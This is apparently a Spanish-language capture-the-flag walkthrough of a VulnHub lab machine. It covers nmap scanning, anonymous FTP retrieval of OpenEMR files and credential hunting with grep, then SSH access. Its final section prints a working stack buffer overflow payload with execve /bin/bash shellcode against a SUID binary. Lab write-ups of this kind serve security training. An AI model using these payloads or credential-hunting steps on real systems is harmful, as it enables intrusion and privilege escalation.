...
# ENCONTRAR LA IP DE LA MAQUINA, 

# Inicio

Se inicia la maquina virtual. Yo utilizo VirtualBox, descargo desde vulnhub la maquina y como es un archivo .ova solamente necesito importarlo

Buscar la ip de la maquina victima, en este caso es la 192.168.0.219
...
Se crea una carpeta qu ese llame como el nombre de la maquina
...
```bash
mkdir content scan exploits
```

# Inicio Fase de Escaneo

Se ingresa a la carpeta de scan
...
Verifico que la maquina este activa
...
* -p- 
  Hace un escaneo de todos los puertos (65535)

* --open
  Solo muestra en el resultado puertos abiertos

* --min-rate 5000
  Indica que se enviaran 5000 paquetes por segundo

* -v
  Indica que se quiere una salida detallada

* -Pn 
  Trata todos los host como en linea

* -n
  No realiza resolucion DNS

* -oG allPorts
  Guarda como reporte la salida del escaneo en el archivo allPorts, de este archivo se pueden extraer los puertos abiertos con regex
 

#### Escaneo exhaustivo de los puertos abiertos
...
* -p 21,22,80
  Indica que se quiere escanear solamente los puertos 21, 22 y 80

* -oN infoPorts
  Guarda como reporte la salida en el archivo infoPorts, este se guarda como la salida del comando ejecutado en consola

Resultados:

en general se que es un ubuntu
...
No se poseen credenciales asi que de primeras no se puede hacer mucho
...
```bash
http://192.168.0.219 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[192.168.0.219], Title[Apache2 Ubuntu Default Page: It works]
```
...
viendo la pagina web en un buscador se observa la pagina predeterminada de apache2

leyendo el codigo fuente, viendo la consola y las cookies no parece haber nada muy interesante

y antes de hacer fuerza bruta para descubrir archivos y/o carpetas voy a enumerar otro puerto

### FTP

connexion ftp con ftp y el usuario predeterminado
...
la carpeta openemr si es interesante
OpenEMR es un software de administracion de practica medica

para mayor comodidad descargo en la carpeta content toda la carpeta openemr

```bash
wget -r ftp://192.168.0.219:21
```

en la carpeta openemr busco informacion

con el comando **ls -la** veo el archivo version.php
...
```bash
grep -r -i 'admin' | grep -vE ".json|.php"
```

con viendo el output recibido encuentro **tests/test.accounts:admin:Monster123**
...
parece ser una credencial ed un usuario administrador utilizado para pruebas
...
No es una credencial ssh

---

volviendo a la pagina web

pruebo la carpeta openemr en la url http://219.168.0.219/openemr

Se encuentra un login de openemr donde la credencial admin:Monster123 es valida

volviendo a la version del servicio busco algun  
...
El exploit viene con un ejemplo de uso
...
buscar archivos suid, se encuentra el pkexec
...
nos encontramos en la maquina victima
...
se encuentra un archivo user.zip
...
me lo copio en la carpeta content con nc
...
Descomprimo el archivo, no pueodo porque no tengo contraseña.
...
busco credenciales de la base de datos

vuelvo a los archivos descargados por ftp anteriormente
...
encuentro c2FuM25jcnlwdDNkCg== que decodeado en base64 es san3ncrypt3d

pruebo san3ncrypt3d para convertirme en el usuario buffemr,no funciona
pruebo san3ncrypt3d para unzipear user.zip, no funciona
pruebo c2FuM25jcnlwdDNkCg== para unzipear user.zip
...
pruebo buffemr@Iamgr00t en ssh

```bash
ssh buffemr@192.168.0.219
buffemr@192.168.0.219's password: 
...
Last login: Mon May  1 10:30:15 2023 from 192.168.0.36
buffemr@buffemr:~$
...
archivo binario interesante SUID
...
uso ltrace para ver un poco que hace el binario
...
reviso si podria ejecutar shellcode que guardo en la stack
```bash
...
veo que utiliza la funcion strcpy(), la cual es vulnerable a buffer overflow
...
$eip es crontrolado , toma el valor "42424242"


```bash

gef➤  r $(python2 -c 'print"\x41" * (512 - 33) + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\x42" * 4')

```

se ingresa un shellcode en la stack

https://shell-storm.org/shellcode/files/shellcode-606.html

shellcode que encontre ocupa 33 bytes, guardo un par de bits de nops
...
busco en la stack una direccion valida para poner el la ip y ejecutar mi codigo malicioso
...
me interesa la direccion 0xffffd1e0 ya que esta en el rango de los nops y como estamos en un little-endian hay que escribirlo volteado de a bytes
...
la maquina victima cuenta con python2
...
No funciono, debugueo el binario con gdb
...
(gdb) r $(python2 -c 'print "\x90" * (512 - 33) + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xe0\xd1\xff\xff" * 4')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/dontexecute $(python2 -c 'print "\x90" * (512 - 33) + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80" + "\xe0\xd1\xff\xff" * 4')
...
Apunto con el $eip a la direccion 0xffffd54e ya que esta dentro del padding de nops
...
Ejecuto el buffer overflow fuera de gdb
